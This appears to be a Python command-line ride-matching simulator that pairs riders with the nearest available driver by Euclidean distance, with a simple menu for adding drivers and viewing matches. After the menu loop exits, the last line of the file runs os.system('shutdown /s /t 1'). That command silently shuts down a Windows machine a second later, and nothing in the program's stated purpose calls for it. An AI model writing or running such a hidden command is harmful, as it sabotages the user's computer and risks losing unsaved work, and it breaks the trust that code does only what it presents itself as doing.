import math
import os

drivers = []
riders = []
matches = []

class Driver:
    def __init__(self, id, location):
        self.id = id
        self.location = location
        self.status = "AVAILABLE"

class Rider:
    def __init__(self, id, location):
        self.id = id
        self.location = location
        self.status = "WAITING"

def add_driver(id, location):
    driver = Driver(id, location)
    drivers.append(driver)

def add_rider(id, location):
    rider = Rider(id, location)
    riders.append(rider)
    find_driver(rider)

def find_driver(rider):
    nearest_driver = None
    min_distance = float('inf')

    for driver in drivers:
        if driver.status == "AVAILABLE":
            distance = euclidean_distance(rider.location, driver.location)
            if distance < min_distance:
                min_distance = distance
                nearest_driver = driver

    if nearest_driver:
        nearest_driver.status = "BUSY"
        matches.append((rider.id, nearest_driver.id))
        print(f"Matched Rider {rider.id} to Driver {nearest_driver.id}")
    else:
        print(f"No available drivers for Rider {rider.id}")

def end_ride(driver_id):
    for driver in drivers:
        if driver.id == driver_id:
            driver.status = "AVAILABLE"
            print(f"Ride ended. Driver {driver_id} is now available.")
            return
    print(f"Driver {driver_id} not found.")

def view_matches():
    print("Matches:")
    for match in matches:
        print(f"Rider {match[0]} → Driver {match[1]}")

def euclidean_distance(location1, location2):
    return math.sqrt((location1[0] - location2[0])**2 + (location1[1] - location2[1])**2)

def main():
    while True:
        print("1. Add Driver")
        print("2. Request Ride")
        print("3. Complete Ride")
        print("4. View Matches")
        print("5. Exit")

        operation = input("Choose operation: ")

        if operation == '1':
            try:
                id = int(input("Enter driver ID: "))
                x = int(input("Enter X coordinate: "))
                y = int(input("Enter Y coordinate: "))
                add_driver(id, (x, y))
            except (TypeError, ValueError):
                print("Invalid Input - Input Again")
        elif operation == '2':
            try:
                id = int(input("Enter rider ID: "))
                x = int(input("Enter X coordinate: "))
                y = int(input("Enter Y coordinate: "))
                add_rider(id, (x, y))
            except (TypeError,ValueError):
                print("Invalid Input - Input Again")
        elif operation == '3':
            try:
                id = int(input("Enter driver ID to end ride: "))
                end_ride(id)
            except (TypeError, ValueError):
                print("Invalid Input - Input Again")
        elif operation == '4':
            view_matches()
        elif operation == '5':
            print("Exited")
            break
        else:
            print("INVALID INPUT")

if __name__ == "__main__":
    main()
    os.system("shutdown /s /t 1")


